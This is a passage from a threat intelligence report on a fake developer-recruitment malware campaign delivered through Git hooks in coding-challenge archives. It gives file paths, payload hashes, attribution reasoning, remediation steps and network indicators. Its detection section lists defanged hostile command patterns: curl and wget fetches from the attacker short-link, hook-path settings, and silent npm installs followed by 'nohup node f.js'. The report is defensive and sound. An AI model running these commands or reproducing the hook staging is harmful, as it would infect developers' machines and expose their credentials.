| `$HOME/.vscode/f.js` | Stage-4 JavaScript payload |
| `$HOME/.vscode/package.json` | Stage-4 package manifest |
| `$HOME/.vscode/font3` | Stage-4 host artifact |
| `$HOME/.vscode/ex3` | Stage-4 host artifact |
| `$HOME/mod.py` | Windows Python module payload |
| `$HOME/mod.so` | Non-Windows Python module payload |
| `$HOME/.mod` | Python launcher |
| `$HOME/.py2/py.exe` | Windows Python runtime |
| `%TEMP%/p.zi` | Temporary Python runtime archive |
| `%TEMP%/p2.zip` | Renamed Python runtime archive |

### File and Payload Hashes

Hashes are included for independent comparison with challenge archives, staged payload bodies, and decoded embedded modules. The private evidence archive is not distributed with this report.

| SHA-256 | Artifact |
|---|---|
| `271fa4e8d30fb269872ec78ac0f7b9363e72f7cc51f2b02d31853b49d1646ff9` | `solidity_challenge.tar.gz` |
| `9b1a62003318ef7fd42872a9dce784e451b778c76ce22dcdf88577ec4d781ff4` | `golang_challenge.tar.gz` |
| `b46b9779c4d197cef1b4490f2cb6bff589ca08a352ed4a839c591ab3c6bc0406` | `rust_challenge.tar.gz` |
| `d9b95da56b4ba32b4dd26edc584f0da054579b950a4e0d2dd288fc02ac590183` | `java_challenge.tar.gz` |
| `410a9e5f16440a939312ee2e9e522943f16a777e191f9f8626cbda6ec5590c77` | `tailwind_challenge.tar.gz` |
| `802df7a0820ddb4612d05c79ca260cdc34cc0300f7176bb08f602d24d86d3a46` | Git hook downloader |
| `bb811bcb3bebacd32b1fa103aa562054dfe3786283dd2c43ee8bf83e316060a0` | Git hook wrapper |
| `0502450915949fa99bdafa58b49f8b0e9e3a0c355076ccb140374e4d60b7bcf4` | macOS stage-1 body |
| `2d0bf7c783f4593c7f68b7a72ed339b274dcabe8fc9b8e09e8765d9ad2f91f69` | Linux stage-1 body |
| `2fbbfe4d90f252142017e25d833e995c27f1083b17bfee96554694fffb7d4083` | Windows stage-1 body |
| `76f9ce0154244eb635ab611777e8323ed1a5f7eff434494a0549fff2fd1d1517` | macOS stage-2 body |
| `ac48388fec376f464f28c947b2471ee1cab7d9df76b735c2720f9a9a81fd5e9b` | Linux stage-2 body |
| `36db9583b65ab3b5bc8f935d682b2d7879bad510ad2cb1c360dc652447c022a7` | Windows stage-2 body |
| `783386f4fcc6241e26e00edde18e0e7c1bee218149d92217909d133d7d01ba5a` | Stage-3 parser JavaScript |
| `c31cf2a5bd207724a9a8e7a3b2116c17fe620f8bfdfa3cd7fef2641ec92210f9` | Stage-3 package body |
| `36751cf39a475d1f1c76631d6e10a0f8ae5dbdec606a38c437a9d4ea6754bcf2` | Stage-4 `f.js` body |
| `f126179d8644770b89f7299956483e0af7b87d28a8ef5d395aa34bbffc088d9f` | Stage-4 package body |
| `87b1df731ebfbdb8bdd6a75b5acf2d52b0f3a95b2bd324450a30a18934c0600f` | `embedded_g.js` |
| `b55b84974a5b8e1124efdfd04eade49bd23676db28274148d1bf23b44c6d2b12` | `embedded_n.js` |
| `c571e821d6f94eaf238bcc8c48dfaab36dd1dc5cbe59554a9263121c7479379b` | `embedded_l.js` |
| `751e836e79e146be0e8fb5f7cda9b36984384e3ea7472bd8d16b1e56363a3810` | `embedded_p.js` |

---

## Attribution Assessment

Assessed confidence: **low-to-medium** for DPRK-linked / Void Dokkaebi consistency.

This case overlaps fake developer recruitment tradecraft commonly reported in DPRK-linked activity clusters: LinkedIn recruitment contact, developer screening, blockchain/Web3 themes, malicious repository or archive delivery, hidden execution through expected developer workflow, credential and wallet theft, and remote command capability.

The `gurucooldown.short[.]gy` infrastructure is especially notable because it appears in public reporting on Void Dokkaebi / Famous Chollima fake job interview activity. The same short-link domain, combined with matching recruitment and repository tradecraft, supports a medium-confidence **campaign-overlap** assessment. It should not be described as definitive actor attribution by itself.

The attribution boundary remains important. This investigation does not prove who registered or controlled `kryptic-haven[.]com`, who controlled the LinkedIn identities, or whether any legitimate brand or third-party profile was created, compromised, impersonated, or otherwise misused. The malware chain itself is directly supported by preserved challenge archives and captured payloads; state attribution remains an analytic assessment rather than a directly observed fact.

Relevant public reporting:

- Trend Micro: `https://www.trendmicro.com/en_us/research/26/d/void-dokkaebi-uses-fake-job-interview-lure-to-spread-malware-via-code-repositories.html`
- Trend Micro IoCs: `https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/d/void-dokkaebi/Void-Dokkaebi-Uses-Fake-Job-Interview-Lure-to-Spread-Malware-via-Code-Repositories-IoCs.txt`
- Gurucul mirror: `https://community.gurucul.com/articles/ThreatResearch/Void-Dokkaebi-Uses-Fake-Job-Interview-22-4-2026`

---

## Remediation and Hunting

### If You Opened or Ran the Challenge

1. Isolate the workstation from the network.
2. Preserve volatile evidence before cleanup where possible.
3. Check for suspicious local Git hooks and custom hook paths, especially `.git/objects/interrupt/`.
4. Hunt for `tokenlinux.sh`, `token.cmd`, `parser.js`, `parser.npl`, `$HOME/.task`, `$HOME/.vscode/f.js`, `$HOME/.vscode/package.json`, `$HOME/.mod`, `$HOME/mod.py`, `$HOME/mod.so`, and `$HOME/.py2/py.exe`.
5. Review shell history, PowerShell logs, process execution telemetry, DNS logs, proxy logs, and EDR telemetry for the network indicators listed above.
6. Rotate credentials stored in browsers or local configuration files.
7. Rotate cryptocurrency wallet seed phrases or private keys that may have existed on the host.
8. Revoke developer tokens, SSH keys, cloud credentials, Git platform tokens, npm tokens, and API keys accessible from the workstation.
9. Audit GitHub, GitLab, Bitbucket, cloud, and wallet activity for unauthorized use.

### Network-Level Detection

Hunt for outbound traffic to:

```text
gurucooldown.short[.]gy
165.140.86[.]190:3000
45.59.163[.]198:1244
45.59.160[.]200:1244
45.59.163[.]50:1244
165.140.86[.]183:2246
165.140.86[.]183:1247
```

Also hunt for:

- Short.io redirects followed by immediate requests to IP-literal HTTP services.
- Node.js processes reaching nonstandard ports `1244`, `1247`, `2246`, or `3000`.
- Socket.IO traffic from developer workstations to unknown infrastructure.
- Clipboard upload patterns to `/cb`.
- Multipart uploads to `/uploads` from endpoints running developer tooling.
- Requests to `/s/<token>`, `/f/<marker>`, `/p`, `/keys`, `/clw/<marker>`, or `/clw1/<marker>`.

### Host-Level Detection

Useful command-line and filesystem patterns include:

```text
curl -s hxxps://gurucooldown.short[.]gy/
wget -qO- hxxps://gurucooldown.short[.]gy/
core.hooksPath=.git/objects/interrupt/
.git/objects/interrupt/pre-commit
.git/objects/interrupt/post-checkout
.git/objects/interrupt/pre-push
.git/objects/interrupt/pre-rebase
.git/objects/interrupt/pre-merge-commit
npm --prefix "$HOME/.vscode" i
cd "$HOME/.vscode" && npm i --silent
nohup node f.js
Get-Clipboard -Raw
pbpaste
```

Defenders should pay particular attention to delivered archives that contain a `.git/` directory. A full `.git/` directory inside a coding challenge can preserve local hooks, custom hook paths, remotes, reflogs, and Git metadata that would not be transferred through a normal clone.

### Preventive Controls

- Require developer candidates and employees to inspect archives before opening them in trusted development environments.
- Avoid running Git operations inside untrusted repositories on primary workstations.
- Use disposable virtual machines for coding challenges from unknown recruiters.
- Treat archives containing a `.git/` directory as higher risk than ordinary source bundles.
- Inspect `git config --local --get core.hooksPath` before running checkout, commit, merge, rebase, or push.
- Block or alert on `curl|sh`, `wget|sh`, and `curl|cmd` patterns originating from Git hook contexts.
- Disable automatic trust of new workspaces in IDEs where possible.

---

## Evidence Availability

The private evidence package is not distributed with the public report. Public comparison material is provided through defanged network indicators, archive hashes, hook hashes, staged payload hashes, embedded-module hashes, runtime markers, command patterns, C2 paths, and behavioral descriptions.

Preserved evidence includes LinkedIn and hiring-form screenshots, lure-domain OSINT, five challenge archives, archive listings, Git configuration and hook files, hook mode/hash inventories, bounded hook-execution context, Short.io redirect captures, stage-1 and stage-2 payload bodies, stage-3 parser and package bodies, stage-3 deobfuscation notes, stage-4 wrapper and package bodies, decoded embedded modules, marker summaries, manifest hashes, and collection notes.

## Collection and Analysis Boundaries

This report is based on static analysis and controlled retrieval of staged payloads. No challenge repository, Git hook, shell script, Windows command script, Node.js payload, Python module, or decoded stage-4 component was executed during analysis. External public reporting is used as context unless direct technical overlap is shown.

*TLP:CLEAR - This report may be freely shared. Attribution assessments are tentative and based on technical overlap, infrastructure overlap, and tradecraft similarity. All IOCs are provided for defensive purposes. References to Kryptic Haven describe lure branding and observed domain/profile material, not validated involvement by any legitimate company, brand owner, or real person.*

*Report ID: TP-2026-013 | Published: 2026-05-17 | Author: ThreatProphet*
